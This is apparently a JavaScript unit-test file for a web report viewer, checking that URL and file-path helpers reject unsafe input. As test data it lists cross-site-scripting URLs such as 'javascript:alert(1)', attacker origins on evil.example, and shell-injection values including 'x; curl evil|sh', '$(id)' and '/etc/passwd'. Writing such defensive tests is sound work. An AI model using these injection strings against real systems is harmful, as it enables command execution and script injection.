import test from 'node:test';
import assert from 'node:assert/strict';
import { sameOriginUrl, safeRunPath } from '../js/safe.js';
import { loadReport, ReportError } from '../js/data.js';
import { traceCommand } from '../js/components/steps.js';

const BASE = 'http://localhost:8080/index.html';

test('sameOriginUrl accepts relative paths and the own origin', () => {
	assert.equal(sameOriginUrl('data/report.json', BASE), 'http://localhost:8080/data/report.json');
	assert.equal(sameOriginUrl('runs/a/diff.png', BASE), 'http://localhost:8080/runs/a/diff.png');
	assert.equal(sameOriginUrl('http://localhost:8080/x.png', BASE), 'http://localhost:8080/x.png');
});

test('sameOriginUrl refuses script URLs, data URLs, other origins and hidden schemes', () => {
	for (const bad of [
		'javascript:alert(1)', ' JavaScript:alert(1)', 'java\tscript:alert(1)', 'java\nscript:alert(1)', 'vbscript:x',
		'data:text/html,<script>1</script>', 'blob:http://localhost:8080/x', '//evil.example/x', '\\\\evil.example\\x',
		'https://evil.example/x', 'http://localhost:9999/x', '', '   ', null, undefined, 42,
	]) assert.equal(sameOriginUrl(bad, BASE), null, String(bad));
});

test('safeRunPath accepts plain relative paths', () => {
	assert.equal(safeRunPath('runs/2026-10-05/trace.zip'), 'runs/2026-10-05/trace.zip');
	assert.equal(safeRunPath('trace.zip'), 'trace.zip');
});

test('safeRunPath refuses anything a shell would read as more than one word or as an option', () => {
	for (const bad of [
		'x; curl evil|sh', 'a b', '$(id)', '`id`', 'a&&b', 'a|b', "a'b", 'a"b', 'a\nb', '-x', '--help', '/etc/passwd',
		'../x', 'a/../b', '~/x', 'a>b', '', null, undefined,
	]) assert.equal(safeRunPath(bad), null, String(bad));
});

test('traceCommand builds a command only for a safe path', () => {
	assert.equal(traceCommand('runs/a/trace.zip'), 'npx playwright show-trace runs/a/trace.zip');
	assert.equal(traceCommand('x; curl evil|sh'), null);
});

test('loadReport refuses an address on another origin before it fetches', async () => {
	let called = false;
	const fetchImpl = async () => { called = true; return { ok: true, json: async () => ({}) }; };
	await assert.rejects(loadReport('https://evil.example/report.json', fetchImpl, BASE), ReportError);
	await assert.rejects(loadReport('javascript:alert(1)', fetchImpl, BASE), ReportError);
	assert.equal(called, false);
});
